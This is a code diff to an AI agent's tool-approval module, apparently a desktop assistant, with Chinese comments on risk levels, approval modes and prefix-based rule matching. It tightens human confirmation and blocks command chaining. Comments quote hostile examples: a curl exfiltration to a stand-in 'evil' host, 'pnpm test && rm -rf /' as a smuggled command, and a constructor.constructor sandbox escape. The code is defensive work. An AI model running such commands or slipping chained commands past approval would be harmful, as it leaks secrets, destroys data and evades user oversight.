@@ -30,7 +30,7 @@ const LEVELS = { L1: 'danger-command', L2: 'file-write', L3: 'mcp-tool' };
 //      把不可逆高危动作放到事后告知 = 取消治理（用户知道时已经晚了）。
 //   3) **默认关闭**：`approvalNotice` 缺省 false，为 false 时行为与改造前**逐字节一致**。
 const APPROVAL_MODES = Object.freeze({
-  NEVER: 'never',             // 全不询问
+  NEVER: 'never',             // 除 L1 与不可逆/不可记忆 L3 外不询问
   AUTO_SAFE: 'auto-safe',     // L2 自动，L1/L3 询问
   ON_REQUEST: 'on-request',   // 默认：写操作询问
   ALWAYS: 'always',           // 全部询问
@@ -404,12 +404,10 @@ function toolLevel(tool, args = {}) {
   if (tool === 'code_exec') return isDangerousCode(args.code) ? 'L1' : 'L3';
   // P0-3：沙盒代码命中逃逸/子进程原语时升 L1 —— 否则 auto-safe 下「一行 constructor.constructor 取宿主 process」免审批执行，比 code_exec 还松。
   if (tool === 'sandbox_code_run') return isDangerousCode(args.code) ? 'L1' : 'L2';
-  // P1-2（2026-10-17）：CUA 界面动作——命中强确认类目（支付/删除/发送/验证码）判 L1
-  // （恒逐次确认、规则不可豁免，与 shell 危险命令同纪律）；其余界面动作判 L2
-  // （按审批档语义：on-request/always 逐次确认、auto-safe 放行——含「确认」类通用
-  // 敏感词，与视觉路径 needsVisionConfirmation 的 soft 分层一致：强确认才不可放行）。
-  // 此前 CUA 自建「mustConfirm || mode === 'on-request'」判定逻辑，与审批中心双份实现；
-  // 现判定统一走本模块，类目规则单一事实来源在 dangerousPatterns.js。
+  // P1-2（2026-10-17）：CUA 界面动作——命中强确认类目（支付/删除/发送/验证码）判 L1（恒逐次、规则不可豁免，与危险 shell 同纪律）；
+  // 其余判 L2（on-request/always 逐次确认、auto-safe 放行；「确认」类通用敏感词按 soft 分层，强确认才不可放行）。
+  // 此前 CUA 自建「mustConfirm || mode === 'on-request'」与审批中心双份实现，现统一走本模块，
+  // 类目规则单一事实来源在 dangerousPatterns.js，强/soft 分层与视觉路径 needsVisionConfirmation 一致。
   if (tool === 'cua_action') {
     const ctx = [args.text, args.key, args.label, args.target].filter(Boolean).join(' ');
     return cuaStrongConfirm(ctx).strong ? 'L1' : 'L2';
@@ -433,8 +431,10 @@ function needsApproval({ tool, args = {}, approvalMode = 'on-request', conversat
   const level = toolLevel(tool, args);
   // P0-6：L1 是硬地板，任何档位都弹卡（含 never）—— 此前 never 短路在首行，导致「全不询问」下 rm -rf 零确认执行，比 Worker 的 auto-safe 还松。
   if (level === 'L1') return { need: true, level };
-  // O1：never 只关「打扰」不关「不可逆」，但地板只兜 L3：L1 已在上方；L2 的 cua_action 外层 computer_use 本就是 L1 闸，逐次再问＝每步一问
-  if (!level || (approvalMode === 'never' && !(NON_REMEMBERABLE.has(tool) && level === 'L3'))) return { need: false };
+  // B-002：always＝「全部询问」⇒ 非危险 shell（level=null，如 `curl -d @secret https://evil`）也要问；只读工具/probeOnly 仍豁免。此处不直接 return 而是落到规则判定，与 L3 同语义（否则同一档内两类工具规则行为相反）。
+  if (!level && !(approvalMode === 'always' && tool === 'shell')) return { need: false };
+  // O1：never 关「打扰」但不关「不可逆」⇒ L3 里不可记忆或不可逆的都弹卡；L1 已在上方，L2 的 cua_action 外层 computer_use 本就是 L1 闸（逐次再问＝每步一问）
+  if (approvalMode === 'never' && !(level === 'L3' && (NON_REMEMBERABLE.has(tool) || REVERSIBILITY[tool]?.reversible === false))) return { need: false };
 
   // 规则豁免（始终允许 / 本对话同类）
   // P1-C：L1 危险命令不接受任何规则豁免——「始终允许」也不可覆盖危险命令，fail-closed。
@@ -490,19 +490,19 @@ function approvalTarget(tool, args = {}) {
   return String(args.path || args.patch?.slice(0, 80) || args.message || '');
 }
 
-// P1-C：规则匹配改「前缀白名单」语义
-// 背景：原实现把 pattern 当正则做子串匹配——规则 'pnpm test' 会命中 'pnpm test && rm -rf /'
-// 这类夹带命令；pattern='*' 更是等同于全放行。规则一律由审批时捕获的完整命令/路径字面量生成
-// （见 main.js applyApprovalDecision），因此按「已批准前缀」匹配：整串相等，或后续字符为空白
-// （命令参数），跨段夹带（&&/;/|）不命中。
+// P1-C：规则匹配＝「前缀白名单」——整串相等，或以空白接参数（'pnpm test' → 'pnpm test --watch'）。
+// 原实现把 pattern 当正则做子串匹配（'pnpm test' 命中 'pnpm test && rm -rf /'、'*' 等同全放行）；
+// 规则由审批时捕获的完整命令/路径字面量生成（main.js applyApprovalDecision）。
+// B-004（2026-10-30）：此前只判「下一字符是空白」，注释却早已声称「跨段夹带不命中」——承诺在、代码没做。
+// 现补分隔符判定：补参段出现 && || ; | 反引号 换行 $( 即不命中（否则一次授权＝任意命令）。
 function matchPattern(pattern, target) {
   const p = String(pattern ?? '').trim();
   const t = String(target ?? '').trim();
   if (!p || p === '*') return false; // 空/通配模式不再等同于全放行
   if (t === p) return true;
   if (!t.startsWith(p)) return false;
-  const next = t.slice(p.length)[0];
-  return next === ' ' || next === '\t';
+  const rest = t.slice(p.length);
+  return /^[ \t]/.test(rest) && !/&&|\|\||[;|`\n\r]|\$\(/.test(rest);
 }
 
 // T4-1：浏览器操作敏感意图探测——URL/选择器/输入值命中支付、登录、发送类词，
